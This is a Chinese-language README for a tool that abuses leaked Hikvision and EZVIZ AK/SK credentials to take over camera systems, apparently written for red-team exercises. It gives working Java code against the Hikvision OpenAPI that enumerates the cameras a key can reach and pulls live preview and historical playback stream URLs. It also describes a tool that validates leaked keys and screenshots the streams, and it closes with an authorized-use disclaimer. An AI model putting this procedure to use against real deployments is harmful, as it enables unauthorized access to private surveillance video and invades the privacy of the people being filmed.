# video-api-check
## 原理分析

海康威视/萤石等通过AK、SK进行身份验证，通过调用接口实现视频预览等功能。因此代码中泄露了key即可能造成摄像头集群被接管。

下面是某次攻防演习实战中遇到的hikvison凭证泄露。

![image-20211227100013822](https://nnotes.oss-cn-hangzhou.aliyuncs.com/notes/image-20211227100013822.png)

某次遇到萤石一个aksk可控7000+摄像头。

![image-20211227100829824](https://nnotes.oss-cn-hangzhou.aliyuncs.com/notes/image-20211227100829824.png)

## 利用方式

### 海康威视

海康API对接(JAVA)

> https://www.freesion.com/article/60261295938/

①下载官方sdk

> https://open.hikvision.com/download/5c67f1e2f05948198c909700?type=10

![image-20211227100140338](https://nnotes.oss-cn-hangzhou.aliyuncs.com/notes/image-20211227100140338.png)

②IDEA新建maven项目，并将OpenAPI认证库导入maven

```
mvn install:install-file 
 -Dfile=/Users/niudai/lang/apache-maven-3.6.3/artemis-http-client-1.1.3.jar
 -DgroupId=artemis-http-client
 -DartifactId=hk
 -Dversion=1.1.3
 -Dpackaging=jar
```

![image-20211227100203972](https://nnotes.oss-cn-hangzhou.aliyuncs.com/notes/image-20211227100203972.png)

③创建项目代码

![](https://nnotes.oss-cn-hangzhou.aliyuncs.com/notes/image-20211227100219316.png)

`pom.xml`增加dependencies

```xml
        <dependency>
            <groupId>artemis-http-client</groupId>
            <artifactId>hk</artifactId>
            <version>1.1.3</version>
        </dependency>
        <dependency>
            <groupId>com.alibaba</groupId>
            <artifactId>fastjson</artifactId>
            <version>1.2.68</version>
        </dependency>
    </dependencies>
```

`DataTypeConversionUtil.java`

```java
public class DataTypeConversionUtil {
    public static Map<String,Object> getStringToMap(String str){
        JSONObject parseObject = JSONArray.parseObject(str);
        return parseObject;
    }
}
```

`HKUtil.java`

```java
import com.alibaba.fastjson.JSONObject;
import com.hikvision.artemis.sdk.ArtemisHttpUtil;
import com.hikvision.artemis.sdk.config.ArtemisConfig;

import java.util.HashMap;
import java.util.Map;

/**
 * 海康工具类
 */
public class HKUtil {
    static {
        // 代理API网关nginx服务器ip端口
        ArtemisConfig.host = "220.xxx.xxx.xxx";
        // 秘钥appkey
        ArtemisConfig.appKey = "xxxx";
        // 秘钥appSecret
        ArtemisConfig.appSecret = "uxxxxx";
    }
    /**
     * 能力开放平台的网站路径
     * TODO 路径不用修改，就是/artemis
     */
    private static final String ARTEMIS_PATH = "/artemis";
    /**
     * 通用海康接口
     * 调用POST请求类型(application/json)接口*
     * @return
     */
    public static Map<String,Object> publicHkInterface(JSONObject jsonBody,String url){
        final String getCamsApi = ARTEMIS_PATH +url;
        Map<String, String> path = new HashMap<String, String>(2);
        path.put("https://", getCamsApi);
        // post请求application/json类型参数
        String result =ArtemisHttpUtil.doPostStringArtemis(path,jsonBody.toJSONString(),null,null,"application/json",null);
        return  DataTypeConversionUtil.getStringToMap(result);
    }


    /**
     * 获取监控点预览取流URL
     * @param id 设备编号
     * @return
     */
    public static Map<String,Object> camerasPreviewURLs(String id){
        JSONObject jsonBody = new JSONObject();
//        jsonBody.put("cameraIndexCode", id);
//        jsonBody.put("protocol", "hls");、
//        jsonBody.put("streamType", 0);
//        jsonBody.put("protocol", "rtsp");
//        jsonBody.put("transmode", 1);
//        jsonBody.put("expand", "streamform=ps");
        Map<String,Object> returnMap=publicHkInterface(jsonBody,"/api/video/v1/cameras/previewURLs");
        return returnMap;
    }

    /**
     * API名称：
     * 查询监控点列表v2
     * 分组：
     * 视频资源接口
     * 提供方名称：
     * 资源目录服务
     * qps：
     * 描述：根据条件查询目录下有权限的监控点列表
     * @return
     */
    public static Map<String,Object> cameraSearch(){
        JSONObject jsonBody = new JSONObject();
        jsonBody.put("pageNo", 1);
        jsonBody.put("pageSize", 1000);
        jsonBody.put("resourceType", "door");
        Map<String,Object> returnMap=publicHkInterface(jsonBody,"/api/resource/v2/camera/search");
        return returnMap;
    }

    public static Map<String,Object> getCameraPlayBackURL(String id){
        JSONObject jsonBody = new JSONObject();
        jsonBody.put("cameraIndexCode", id);
//        jsonBody.put("protocol", "rtsp");
        jsonBody.put("beginTime", "2020-12-15T09:35:06.000+08:00");
        jsonBody.put("endTime", "2021-06-17T15:00:00.000+08:00");
        Map<String,Object> returnMap=publicHkInterface(jsonBody,"/api/video/v1/cameras/playbackURLs");
        return returnMap;
    }


    public static void main(String[] args) {
        System.out.println(cameraSearch());
//        System.out.println(camerasPreviewURLs("33068100001310938991"));
//        System.out.println(getCameraPlayBackURL("33068100001310938991"));
    }
}
```

先通过`cameraSearch()`即`/api/resource/v2/camera/search`接口，获取有权限的设备列表的信息。

<img src="https://nnotes.oss-cn-hangzhou.aliyuncs.com/notes/image-20211227100342015.png" alt="image-20211227100342015" style="zoom:50%;" />

比较重要的信息是`indexCode`和`regionPathName`，

获取视频流是调用`camerasPreviewURLs()`即`/api/video/v1/cameras/previewURLs`接口，需要传入`indexCode`，根据官方文档可以设置不同的取流协议（默认是rtsp）。

返回的视频流地址使用VLC连接即可。

![image-20211227100426041](https://nnotes.oss-cn-hangzhou.aliyuncs.com/notes/image-20211227100426041.png)

### 萤石

原理与海康威视大致相同，主要有两个区别。

1、不需要下载sdk，可以直接使用普通的http请求。

2、API接口由萤石官方提供`https://open.ys7.com`，海康则是部署在客户服务器上。

## 工具开发

开发了一个工具实现了以下功能。

1、验证泄露的key是否有效。

2、获取有权限的监控点列表。

3、输入视频流地址进行截图保存功能。

![](https://nnotes.oss-cn-hangzhou.aliyuncs.com/notes/image-20211227100543909.png)

## 免责声明

本工具仅面向**合法授权**的企业安全建设行为，且仅供学习研究自查使用，切勿用于非法用途，由使用该工具产生的一切风险均与本人无关！

